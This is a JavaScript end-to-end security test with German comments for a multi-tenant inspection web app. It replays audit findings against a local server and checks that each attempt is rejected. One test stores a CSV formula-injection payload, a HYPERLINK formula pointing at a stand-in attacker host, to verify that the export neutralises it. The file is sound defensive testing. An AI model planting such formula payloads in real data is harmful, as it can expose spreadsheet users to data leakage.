// E2E 08-security: stellt die Angriffswege aus dem Sicherheitsaudit nach und erwartet, dass sie blockiert sind.
// Nur lokal ausführen (legt einen zweiten Workspace an).
if (!process.env.DEMO_PASSWORD) throw new Error('DEMO_PASSWORD fehlt');
const BASE = process.env.BASE || 'http://localhost:5173';
const PW = process.env.DEMO_PASSWORD;
const fail = [];
const check = (ok, m) => {
  if (!ok) {
    fail.push(m);
    console.log('  ✗', m);
  }
};

/** Minimaler Client mit Cookie-Sitzung. */
function client() {
  let cookie = '';
  const call = async (path, { method, body, headers = {} } = {}) => {
    const r = await fetch(BASE + '/api' + path, {
      method: method ?? (body !== undefined ? 'POST' : 'GET'),
      headers: { 'x-pk': '1', cookie, ...(body !== undefined ? { 'content-type': 'application/json' } : {}), ...headers },
      body: body !== undefined ? JSON.stringify(body) : undefined,
    });
    const sc = r.headers.get('set-cookie');
    if (sc) cookie = sc.split(';')[0];
    const text = await r.text();
    let json = null;
    try {
      json = JSON.parse(text);
    } catch {
      /* kein JSON */
    }
    return { status: r.status, json, text, headers: r.headers };
  };
  call.login = (email, password = PW) => call('/auth/login', { body: { email, password } });
  return call;
}

(async () => {
  if (process.env.PROD) throw new Error('08-security nicht gegen Produktion ausführen');
  const owner = client();
  check((await owner.login('demo@example.com')).status === 200, 'Login Inhaber');

  console.log('· #1 Passwort-Link nicht workspace-übergreifend');
  const mallory = client();
  const reg = await mallory('/auth/register', { body: { company: 'Mallory GmbH', name: 'Mallory', email: `mallory${Date.now()}@example.com`, password: 'mallory-passwort-1' } });
  check(reg.status === 200, `zweiter Workspace registriert (${reg.status})`);
  const inv = await mallory('/account/members/invite', { body: { email: 'pruefer@example.com', role: 'viewer' } });
  const victim = client();
  await victim.login('pruefer@example.com');
  const acc = await victim(`/auth/invite/${inv.json.token}`, { body: { password: PW } });
  check(acc.status === 200, `Opfer nimmt Einladung an (${acc.status})`);
  const members = (await mallory('/account/members')).json.members;
  const v = members.find((m) => m.email === 'pruefer@example.com');
  const rl = await mallory(`/account/members/${v.id}/reset-link`, { method: 'POST' });
  check(rl.status === 403, `Reset-Link für Mitglied anderer Workspaces abgelehnt (${rl.status})`);
  // Admin darf keinen Link für einen anderen Admin erzeugen; Inhaber für Prüfer (nur hier Mitglied) schon
  const own = (await owner('/account/members')).json.members;
  const p2 = own.find((m) => m.email === 'pruefer2@example.com');
  check((await owner(`/account/members/${p2.id}/reset-link`, { method: 'POST' })).status === 200, 'Inhaber erzeugt Link für eigenen Prüfer');

  console.log('· #2 fremde Dateien über Begehungsfotos');
  const props = (await owner('/properties')).json;
  const w = await owner(`/properties/${props[0].id}/walkthroughs`, { body: {} });
  const wid = w.json?.id;
  const wd = (await owner(`/walkthroughs/${wid}`)).json;
  const q0 = wd.questions[0];
  const put = await owner(`/walkthroughs/${wid}`, {
    method: 'PUT',
    body: { answers: { [q0.id]: 'defect' }, findings: [{ questionId: q0.id, title: 'x', note: '', severity: 'low', photoKey: 'fremderworkspace/geheim' }], notes: '', participants: '', signature: null, signerName: '' },
  });
  check(put.status === 400, `fremder photoKey abgelehnt (${put.status})`);
  await owner(`/walkthroughs/${wid}`, { method: 'DELETE' });

  console.log('· #3 Freigabe-Token nicht für Lesezugriff');
  const viewer = client();
  await viewer.login('lesen@example.com');
  const vt = (await viewer('/tasks')).json;
  check(Array.isArray(vt) && vt.length > 0 && vt.every((t) => t.shareToken == null), 'Lesezugriff sieht keine Freigabe-Tokens');
  const ot = (await owner('/tasks')).json;
  check(ot.some((t) => t.shareToken), 'Inhaber sieht Freigabe-Tokens');

  console.log('· #7 CSV-Formel-Injection');
  const asset = (await owner('/assets')).json[0];
  const detail = (await owner(`/assets/${asset.id}`)).json;
  const patched = await owner(`/assets/${asset.id}`, {
    method: 'PATCH',
    body: { buildingId: detail.buildingId ?? asset.buildingId, location: '=HYPERLINK("http://evil.example/?x","x")', floor: detail.floor ?? '', manufacturer: detail.manufacturer ?? '', model: detail.model ?? '', attributes: detail.attributes ?? {} },
  });
  check(patched.status === 200, `Element mit Formel gespeichert (${patched.status} ${patched.text.slice(0, 80)})`);
  const csv = (await owner('/export/assets.csv')).text;
  check(csv.includes(`"'=HYPERLINK(`) || csv.includes(`'=HYPERLINK(`), 'Formel im CSV entschärft');
  check(!/;"?=HYPERLINK/.test(csv), 'keine Zelle beginnt mit =');

  console.log('· #8 Leseschlüssel kann keine Berichte löschen');
  const key = (await owner('/account/api-keys', { body: { name: 'sec-test', scope: 'read', expiresInDays: 1 } })).json.key;
  const created = await fetch(`${BASE}/api/reports?kind=compliance&title=Sicherheitstest&fileName=t.pdf`, {
    method: 'POST',
    headers: { 'x-pk': '1', 'content-type': 'application/pdf', cookie: await (async () => {
      const r = await fetch(BASE + '/api/auth/login', { method: 'POST', headers: { 'x-pk': '1', 'content-type': 'application/json' }, body: JSON.stringify({ email: 'demo@example.com', password: PW }) });
      return r.headers.get('set-cookie').split(';')[0];
    })() },
    body: '%PDF-1.4 test',
  }).then((r) => r.json());
  const del = await fetch(`${BASE}/api/reports/${created.id}`, { method: 'DELETE', headers: { authorization: `Bearer ${key}` } });
  check(del.status === 403, `Bericht löschen mit Leseschlüssel verboten (${del.status})`);

  console.log('· #10 Prüfer verwirft keine fremden Entwürfe');
  const insp = client();
  await insp.login('pruefer2@example.com');
  const a2 = (await owner('/assets')).json.find((x) => x.category === 'smoke_alarm');
  const draft = await owner(`/assets/${a2.id}/inspections`, { body: {} });
  const did = draft.json.id ?? draft.json.inspection?.id;
  check((await insp(`/inspections/${did}`, { method: 'DELETE' })).status === 409, 'fremder Entwurf nicht verwerfbar');
  check((await owner(`/inspections/${did}`, { method: 'DELETE' })).status === 200, 'eigener Entwurf verwerfbar');

  console.log('· #11 Push nur an bekannte Dienste');
  const ps = await owner('/push/subscribe', { body: { endpoint: 'https://intern.example.com/hook', keys: { p256dh: 'x', auth: 'y' } } });
  check(ps.status === 400, `beliebige Push-URL abgelehnt (${ps.status})`);

  console.log('· #12 Unterschrift nur als Bild');
  const d2 = await owner(`/assets/${a2.id}/inspections`, { body: {} });
  const d2id = d2.json.id ?? d2.json.inspection?.id;
  const sig = await owner(`/inspections/${d2id}`, { method: 'PUT', body: { kind: 'periodic', answers: {}, signature: 'https://tracker.example/pixel.gif' } });
  check(sig.status === 400, `externe Unterschrift-URL abgelehnt (${sig.status})`);
  await owner(`/inspections/${d2id}`, { method: 'DELETE' });

  console.log('· #4 Security-Header');
  const page = await fetch(BASE + '/login');
  const api = await fetch(BASE + '/api/health');
  console.log(`   Seite: CSP ${page.headers.get('content-security-policy') ? 'ja' : 'nein (Dev-Server liefert _headers nicht aus)'}`);
  check(api.headers.get('x-frame-options') === 'DENY' && /sandbox/.test(api.headers.get('content-security-policy') ?? ''), 'API-Header gesetzt');

  console.log('· #16 API-Schlüssel nach Entfernen widerrufen');
  const k2 = (await insp('/account/api-keys', { body: { name: 'x', scope: 'read' } })).status;
  check(k2 === 403, `Prüfer darf keine Schlüssel anlegen (${k2})`);

  console.log('· #25 Zugriffsbereich lässt sich nicht umgehen');
  const S = props[0];
  const oDefect = (await owner('/defects')).json.find((d) => d.propertyId !== S.id);
  const O = props.find((p) => p.id === oDefect.propertyId);
  const pid2 = (await owner('/account/members')).json.members.find((m) => m.email === 'pruefer2@example.com').id;
  check((await owner(`/account/members/${pid2}/access`, { method: 'PUT', body: { scope: { propertyIds: [S.id], buildingIds: [] }, canCreate: true } })).status === 200, 'Prüfer eingeschränkt');
  const allA = (await owner('/assets')).json;
  const oAsset = allA.find((x) => x.propertyId === O.id);
  const sAsset = allA.find((x) => x.propertyId === S.id);
  // Mangel außerhalb des Bereichs über eine Aufgabe „erledigen“ (früher möglich: Aufgabe verknüpfen, dann auf erledigt setzen)
  let res = await insp('/tasks', { body: { title: 'Umgehung', defectId: oDefect.id, status: 'done' } });
  check(res.status === 404, `Aufgabe mit fremdem Mangel abgelehnt (${res.status})`);
  check((await owner('/defects')).json.some((d) => d.id === oDefect.id), 'fremder Mangel bleibt offen');
  const ownTask = await insp('/tasks', { body: { title: 'Eigene Aufgabe', propertyId: S.id } });
  res = await insp(`/tasks/${ownTask.json.id}`, { method: 'PATCH', body: { title: 'Eigene Aufgabe', propertyId: S.id, defectId: oDefect.id, status: 'done' } });
  check(res.status === 404, `fremden Mangel nachträglich verknüpfen abgelehnt (${res.status})`);
  // Existenz nicht erkennbar: unbekannt und außerhalb des Bereichs liefern dieselbe Antwort
  const ghost = await insp('/tasks', { body: { title: 'x', defectId: 'zzzzzzzzzzzzzzzz' } });
  const foreign = await insp('/tasks', { body: { title: 'x', assetId: oAsset.id } });
  check(ghost.status === 404 && foreign.status === 404 && ghost.json.error === (await insp('/tasks', { body: { title: 'x', defectId: oDefect.id } })).json.error, 'kein Existenz-Orakel über Aufgaben');
  // Offline-Abgleich mit fremdem Element
  res = await insp('/inspections/offline', {
    body: { clientId: `sec-${Date.now()}`, assetId: oAsset.id, schedule: 'main', inspectedAt: Date.now(), checkpoints: [{ id: 'a', label: 'A' }], kinds: ['periodic'], answers: { a: 'ok' }, signature: 'data:image/png;base64,AAAA', signerName: 'x' },
  });
  check(res.status === 404, `Offline-Prüfung an fremdem Element abgelehnt (${res.status})`);
  // Etikett-Konflikt verrät nicht den Code eines fremden Elements
  await owner(`/assets/${oAsset.id}/label`, { method: 'PUT', body: { labelCode: 'SEC-LABEL-21' } });
  res = await insp(`/assets/${sAsset.id}/label`, { method: 'PUT', body: { labelCode: 'SEC-LABEL-21' } });
  check(res.status === 409 && !res.text.includes(oAsset.code), `Etikett-Konflikt ohne fremden Code (${res.status} ${res.text})`);
  // Berichtsarchiv: workspace-weite und fremde Objektberichte nicht abrufbar
  const ownerCookie = await (async () => {
    const lr = await fetch(BASE + '/api/auth/login', { method: 'POST', headers: { 'x-pk': '1', 'content-type': 'application/json' }, body: JSON.stringify({ email: 'demo@example.com', password: PW }) });
    return lr.headers.get('set-cookie').split(';')[0];
  })();
  const oReport = await fetch(`${BASE}/api/reports?kind=property&title=Fremd&fileName=f.pdf&propertyId=${O.id}`, {
    method: 'POST',
    headers: { 'x-pk': '1', 'content-type': 'application/pdf', cookie: ownerCookie },
    body: '%PDF-1.4 fremd',
  }).then((r) => r.json());
  const list = (await insp('/reports')).json;
  check(!list.some((x) => x.id === oReport.id || x.id === created.id), 'Archiv zeigt keine fremden bzw. workspace-weiten Berichte');
  check((await insp(`/reports/${oReport.id}/file`)).status === 404 && (await insp(`/reports/${created.id}/file`)).status === 404, 'fremde Berichte nicht herunterladbar');
  res = await fetch(`${BASE}/api/reports?kind=compliance&title=x&fileName=x.pdf`, { method: 'POST', headers: { 'x-pk': '1', 'content-type': 'application/pdf', cookie: await (async () => {
    const lr = await fetch(BASE + '/api/auth/login', { method: 'POST', headers: { 'x-pk': '1', 'content-type': 'application/json' }, body: JSON.stringify({ email: 'pruefer2@example.com', password: PW }) });
    return lr.headers.get('set-cookie').split(';')[0];
  })() }, body: '%PDF-1.4 x' });
  check(res.status === 404, `eingeschränkt: kein workspace-weiter Bericht (${res.status})`);
  // Aktivitätsprotokoll und Mitgliederliste geben keine fremden Bereiche preis
  const acts = (await insp('/account/activity')).json;
  check(acts.every((x) => x.userName === 'Aylin Demir'), 'Aktivitätsprotokoll nur eigene Einträge');
  check((await insp('/account/members')).json.members.every((m) => m.email === 'pruefer2@example.com' || m.scope === null), 'Bereiche anderer nicht sichtbar');
  // Rolle/Bereich selbst ändern geht nicht
  check((await insp(`/account/members/${pid2}/access`, { method: 'PUT', body: { scope: null, canCreate: true } })).status === 403, 'eigenen Bereich nicht selbst aufheben');
  console.log('· #26 Aufgaben und Mängel: Rollen und Workspace-Grenzen');
  const reader = client();
  await reader.login('lesen@example.com');
  const myDefect = (await owner('/defects')).json[0];
  check((await reader(`/defects/${myDefect.id}/hide`, { body: { reason: 'x' } })).status === 403, 'Lesezugriff blendet nicht aus');
  check((await insp(`/defects/${myDefect.id}/hide`, { body: { reason: 'x' } })).status === 403, 'Prüfer blendet nicht aus');
  check((await reader(`/defects/${myDefect.id}`, { method: 'PATCH', body: { status: 'resolved', note: 'x' } })).status === 403, 'Lesezugriff behebt nicht');
  check((await reader('/tasks/bulk', { body: { ids: ['x'], status: 'done' } })).status === 403, 'Lesezugriff ohne Mehrfachbearbeitung');
  // Daten im fremden Workspace (Mallory) anlegen
  const mProp = (await mallory('/properties', { body: { name: 'Mallory Objekt' } })).json.id;
  const mDefect = (await mallory('/defects', { body: { propertyId: mProp, title: 'Fremder Mangel', severity: 'low' } })).json.id;
  const mTask = (await mallory('/tasks', { body: { title: 'Fremde Aufgabe', propertyId: mProp } })).json.id;
  check(!!mDefect && !!mTask, 'Fremde Daten angelegt');
  const malloryId = (await mallory('/account/me')).json.user.id;
  check((await owner(`/defects/${mDefect}`)).status === 404, 'fremder Mangel-Detail → 404');
  check((await owner(`/defects/${mDefect}/hide`, { body: { reason: 'x' } })).status === 404, 'fremden Mangel ausblenden → 404');
  check((await owner(`/defects/${mDefect}`, { method: 'PATCH', body: { status: 'resolved' } })).status === 404, 'fremden Mangel beheben → 404');
  check((await owner(`/tasks/${mTask}/watchers`)).status === 404, 'fremde Beobachter → 404');
  check((await owner(`/tasks/${mTask}/watch`, { method: 'POST' })).status === 404, 'fremde Aufgabe beobachten → 404');
  check((await owner(`/tasks/${mTask}/comments`, { body: { body: 'x' } })).status === 404, 'fremde Aufgabe kommentieren → 404');
  check((await owner('/tasks/bulk', { body: { ids: [mTask], status: 'done' } })).status === 404, 'fremde Aufgabe in Mehrfachbearbeitung → 404');
  check((await mallory('/tasks')).json.find((t) => t.id === mTask)?.status === 'open', 'fremde Aufgabe unverändert');
  const mentionTask = (await owner('/tasks', { body: { title: 'Sicherheitstest Erwähnung' } })).json.id;
  const men = await owner(`/tasks/${mentionTask}/comments`, { body: { body: '@Mallory', mentions: [malloryId] } });
  check(men.status === 400, `Erwähnung eines Nicht-Mitglieds abgelehnt (${men.status})`);
  check(!(await mallory('/notifications')).json.items.some((x) => /Sicherheitstest/.test(x.title)), 'keine Meldung an Nicht-Mitglied');
  check((await owner('/tasks', { body: { title: 'x', defectId: mDefect } })).status === 400, 'Aufgabe mit fremdem Mangel abgelehnt');
  const fk = await owner(`/defects/${myDefect.id}`, { method: 'PATCH', body: { status: 'resolved', photoKey: `${'x'.repeat(8)}/fremd` } });
  check(fk.status === 400, `fremder Foto-Schlüssel bei Behebung abgelehnt (${fk.status})`);

  console.log(fail.length ? `FAILED ${fail.length}: ${fail.join('; ')}` : 'ALL CHECKS OK');
  if (fail.length) process.exitCode = 1;
})().catch((e) => {
  console.log('FAIL', e.stack);
  process.exit(1);
});
